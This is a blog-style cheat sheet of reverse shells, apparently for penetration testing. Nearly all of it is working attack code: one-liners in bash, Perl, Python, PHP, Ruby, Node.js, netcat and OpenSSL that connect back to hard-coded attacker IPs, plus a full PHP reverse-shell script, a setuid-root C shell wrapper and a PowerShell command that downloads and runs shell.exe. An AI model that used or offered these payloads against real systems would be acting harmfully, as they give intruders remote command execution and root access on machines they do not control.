---
layout: post
title: Shell & Reverse Shell
description: >
  There are list of Shell and Reverse Shell Collected from Internet.
---


## Find Out What program are Install

```bash

$ for item in $(echo "nmap nc perl python ruby gcc wget sudo curl php"); do which $item; done

```



## C Shell

> #### vim cShell.c
```c

int main(){
    setresuid(0,0,0);
    system("/bin/bash");
}

```
> #### for compile `$ gcc cShell.c -o cShell`

## TTY Shell

```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
# Background shell with `Ctrl+z`

$ echo $TERM && tput lines && tput cols
$ stty raw -echo
$ fg
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <num>

``` 
### Bash

```bash

$ exec 5<>/dev/tcp/10.10.11.11/9001 cat <&5 | while read line;do $line 2>&5 >&5;done

```


```bash
$ bash -i >& /dev/tcp/10.10.10.1/9001 0>&1

```

### Perl

```bash

$ perl -e 'use Socket;$i="10.10.11.14";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&s");open(STDERR,">&s");exec("/bin/sh -i");};'

```


### Python

```bash

$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.11",9003));os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


```





### PHP

```bash

$ php -r '$sock=fsockopen("10.10.14.11",9001);exec("/bin/sh -i <&3 >&3 2>&3");'

```

```php

<?php set_time_limit(0);$VERSION="1.0";$ip='10.10.11.11';$port=9001;$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a; w; id; /bin/sh -i';$daemon=0;$debug=0;if(function_exists('pcntl_fork')){$pid=pcntl_fork();if($pid==-1){printit("ERROR: Can't fork");exit(1);}if($pid){exit(0);}if(posix_setsid()==-1){printit("Error: Can't setsid()");exit(1);}$daemon=1;}else {printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");}chdir("/");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){printit("$errstr ($errno)");exit(1);}$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){printit("ERROR: Can't spawn shell");exit(1);}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);printit("Successfully opened reverse shell to $ip:$port");while(1){if(feof($sock)){printit("ERROR: Shell connection terminated");break;}if(feof($pipes[1])){printit("ERROR: Shell process terminated");break;}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){if($debug)printit("SOCK READ");$input=fread($sock,$chunk_size);if($debug)printit("SOCK: $input");fwrite($pipes[0],$input);}if(in_array($pipes[1],$read_a)){if($debug)printit("STDOUT READ");$input=fread($pipes[1],$chunk_size);if($debug)printit("STDOUT: $input");fwrite($sock,$input);}if(in_array($pipes[2],$read_a)){if($debug)printit("STDERR READ");$input=fread($pipes[2],$chunk_size);if($debug)printit("STDERR: $input");fwrite($sock,$input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit($string){if(!$daemon){print"$string\n";}}?>

```



### Ruby
 
```bash

$ ruby -rsocket -e 'f=TCPSocket.open("10.10.11.11",9001).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

```
> ## or

```bash

$ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.11.11","9001");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end';

```


### Nodejs

```javascript

(function(){
    const net = require("net");
    const cp = require("child_process");
    const sh = cp.spawn("/bin/sh",[]);

    const client = new net.Socket();
    client.connect(9001,"10.10.11.11",function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();

``` 

```javascript

 require('child_process').exec('nc -e /bin/sh 10.10.11.11 9001')

```





### Netcat With -e 

```nc

$ nc -e /bin/sh 10.10.10.1 9001

```

### Netcat Without -e 

```nc 

$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.11.11 9001 >/tmp/f

```


### OpenSSL

```bash

$ mkdir -p ~/tmp/openssl && cd ~/tmp/openssl && openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -key key.pem -cert cert.pem -accept 8000

$ mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -qu -connect 10.10.11.11:8000 > /tmp/s; rm /tmp/s

```





### Binary Execute

- https://github.com/audibleblink/gorsh
- https://github.com/infoskirmish/Window-Tools/tree/master/Simple%20Reverse%20Shell


### Server 

```python

$ python3 -m http.server 

```

### Downloader

```powershell

powershell -command "((new-object System.Net.WebClient).DownloadFile('http://10.10.11.11:8080/shell.exe','%TEMP%\shell.exe'))";"c:\windows\system32\cmd.exe /c %TEMP%\shell.exe"

```

### Not Powershell

- https://github.com/Ben0xA/nps